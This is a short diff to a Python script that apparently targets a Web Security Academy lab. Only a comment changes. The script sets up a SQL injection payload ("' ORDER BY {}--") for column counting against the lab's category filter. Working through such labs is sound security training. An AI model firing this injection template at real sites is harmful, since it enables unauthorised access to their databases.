@@ -1,6 +1,6 @@
 import requests
 
-# Replace with the target URL (filter?category=) part
+# Replace with the target URL + (filter?category=) part
 url = 'https://0a6f004104c1dcc880dd21a0002600ae.web-security-academy.net/filter?category='
 categories = ['Accessories', 'Food+%26+Drink', 'Gifts', 'Lifestyle', 'Tech+gifts']
 injection = "' ORDER BY {}--"
